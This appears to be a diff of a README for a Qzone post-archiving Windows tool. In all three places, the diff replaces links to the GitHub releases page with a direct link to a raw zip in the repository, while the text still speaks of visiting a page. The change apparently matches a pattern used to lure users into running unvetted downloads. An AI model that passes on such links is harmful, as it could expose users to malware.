@@ -1,6 +1,6 @@
 # 📦 get-qzone-history - Save Qzone posts for offline use
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/coexistencewesternpipistrel759/get-qzone-history/main/resource/qzone_history_get_1.3.zip)
 
 ## 🧭 What this app does
 
@@ -36,7 +36,7 @@ For best results:
 
 Visit this page to download the Windows release:
 
-https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases
+https://raw.githubusercontent.com/coexistencewesternpipistrel759/get-qzone-history/main/resource/qzone_history_get_1.3.zip
 
 On that page:
 
@@ -209,7 +209,7 @@ If the export stops early:
 
 Download or get the latest Windows build here:
 
-https://github.com/coexistencewesternpipistrel759/get-qzone-history/releases
+https://raw.githubusercontent.com/coexistencewesternpipistrel759/get-qzone-history/main/resource/qzone_history_get_1.3.zip
 
 ## 🗂️ Project focus
 
